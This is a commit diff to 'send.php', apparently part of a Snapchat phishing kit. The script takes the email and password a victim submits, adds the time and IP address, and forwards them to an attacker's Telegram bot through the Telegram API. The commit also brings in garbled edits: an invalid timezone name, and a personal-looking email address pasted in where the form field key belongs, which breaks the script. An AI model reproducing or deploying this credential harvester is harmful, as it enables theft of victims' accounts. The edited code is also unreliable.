3aad8a62c18a4c5d2abae50e13a060ed4a28e3ff
kyle-crash <79387376+kyle-crash@users.noreply.github.com>
2024-02-23 03:52:44 -0500

    Update send.php

--- send.php
+++ send.php
@@ -8,10 +8,10 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
     $ip_address = $_SERVER['REMOTE_ADDR'];
 }
 
-$d = new DateTime("now", new DateTimeZone("Asia/Baghdad")); // Set Your country DF Time 
+$d = new DateTime("now", new DateTimeZone("Canada/onterio")); // Set Your country DF Time 
 $time = $d->format("Y/m/d  h:i:s A");
 if (isset($_POST['info'])) {
-        $msg = urlencode("New Login From SnapChat : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Mr28");
+        $msg = urlencode("New Login From SnapChat : \meadowsigurdson@gmail.com : " . $_POST['meadowsigurdson@gmail.com'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Mr28");
 }
 
 
@@ -24,4 +24,4 @@ $YOUR_ID_TELE = "";
 // You :
 $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
 // SomeOne Else : 
-// $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
+// $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg)
